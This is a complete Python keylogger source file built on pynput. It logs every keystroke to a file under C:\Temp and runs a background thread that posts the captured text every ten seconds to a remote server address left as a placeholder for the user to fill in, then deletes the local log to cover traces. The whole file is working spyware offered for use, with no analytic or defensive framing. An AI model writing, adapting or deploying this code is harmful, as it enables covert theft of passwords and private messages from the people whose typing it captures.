from pynput import keyboard
import threading
import time
import os
import requests


class Keylogger:
    def __init__(self):
        # path to log file
        self.log_file = "C:\\Temp\\keylogs.txt"
        # make sure the file exists
        os.makedirs(os.path.dirname(self.log_file), exist_ok=True)

        # URL of your server (make sure you customize it to your ID)
        self.server_url = "http://your_ID:5000/logs"

    def on_press(self, key):
        try:
            with open(self.log_file, 'a', encoding="utf-8") as f:
                f.write(f'{key.char}')
        except AttributeError:
            if key == key.space:
                with open(self.log_file, 'a', encoding="utf-8") as f:
                    f.write(' ')
            elif key == key.enter:
                with open(self.log_file, 'a', encoding="utf-8") as f:
                    f.write('\n')
            elif key in (key.backspace, key.shift, key.shift_r):
                # NO logging for backspace and shift
                pass
            else:
                with open(self.log_file, 'a', encoding="utf-8") as f:
                    f.write(f' {key} ')

    def send_logs_to_server(self):
        """send the logs every ten seconds to the server"""
        while True:
            time.sleep(10)
            if os.path.exists(self.log_file):
                try:
                    with open(self.log_file, 'r', encoding="utf-8") as file:
                        log_data = file.read()

                    response = requests.post(self.server_url, data={'keylogs': log_data})

                    if response.status_code == 200:
                        print("Logs send succesfully.")
                        os.remove(self.log_file)  # delete the file after succes
                    else:
                        print(f"error, error code: {response.status_code}")

                except Exception as e:
                    print(f"can't send logs: {e}")

    def start(self):
        """Start the keylogger"""
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()


def main():
    keylogger = Keylogger()

    # Start thread to send logs
    threading.Thread(target=keylogger.send_logs_to_server, daemon=True).start()

    # Start listening to the keys
    keylogger.start()


if __name__ == "__main__":
    main()
